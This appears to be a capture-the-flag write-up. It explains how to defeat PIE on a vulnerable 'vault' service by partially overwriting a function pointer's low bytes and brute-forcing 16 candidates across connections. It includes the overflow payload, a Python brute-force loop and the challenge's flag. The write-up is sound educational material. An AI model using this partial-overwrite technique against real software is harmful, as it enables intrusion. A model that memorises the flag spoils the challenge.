## Solution

**TL;DR** — PIE and the canary are both on and `info` leaks no code
addresses — but ASLR only slides whole pages. `denied` and
`print_flag` share a page (offsets `0x300` / `0x1e0` locally), so the
low byte of the target is fixed and only 4 bits of the next byte are
unknown. Overwrite `on_auth`'s low 2 bytes precisely (72 filler bytes
stop before the canary) and cycle the 16 candidates across fresh
connections:

```
store A*72 + b"\xe0" + b1    # b1 in {0x01, 0x11, ..., 0xF1}
run
```

### 1. Recon

```
$ nc <host> 1338
ordinary engineering — vault-svc v1 (legacy)
...
info
build=v1.4.2-h vault=0x7ff... epoch=20260906 labels_stored=1
```

`info` gives a *stack* address. Stack and code mappings are
randomized independently, so it says nothing about where `print_flag`
lives — a leftover that looks like a lead and isn't one.

```
$ nm vault | grep -E "denied|print_flag"
0000000000001300 t denied
00000000000011e0 t print_flag
```

The binary keeps its symbols. Both functions sit in the same page
(`0x1000`–`0x1FFF`).

### 2. The bug

`vault.c` (shipped in the handout):

```c
struct vault {
    char     buf[64];
    uint64_t epoch;
    void   (*on_auth)(void);
};
...
memcpy(v.buf, payload, (size_t)plen);   /* no bounds check */
```

Same overflow as ever: `on_auth` is at `buf+72`. The canary sits far
above the struct (there is a 256-byte line buffer in between), so a
precise 74-byte write never touches it — the canary guards the return
address, not the locals. Full 8-byte overwrite is impossible without
the base, and there is no leak left. That leaves the low bytes.

### 3. The partial overwrite

Under PIE the mapping base moves per connection, but only in whole
pages: low 12 bits are link-time constants. Locally:

```
denied      ...?300     (page offset 0x300)
print_flag  ...?1e0     (page offset 0x1e0)
```

`on_auth` currently holds `denied`. Its low byte must become `0xe0`
(fixed — the page never slides). Its second byte is
`((base + 0x1e0) >> 8) & 0xFF`: the page offset contributes `0x01`,
the base contributes 4 unknown bits — 16 candidates:
`0x01, 0x11, …, 0xF1`. Everything above is shared with `denied` and
stays untouched.

### 4. The exploit

One connection per guess (a wrong guess crashes that session, which
is fine — the next connection re-randomizes and you try the next
candidate):

```python
cands = [0x01 + 16*k for k in range(16)]
for hi in cycle(cands):
    connect()
    send(b"store " + b"A"*72 + bytes([0xe0, hi]))
    send(b"run")   # -> access denied / crash, or the flag
```

About 16 connections on average. `admin/solve.py` derives the page
offsets from the local binary with `nm` (asserting both functions
share a page) and loops until the flag appears.

### Flag

```
cyber_quest{l3gacy_v4ult_0v3rwr1t3_8f3a21}
```
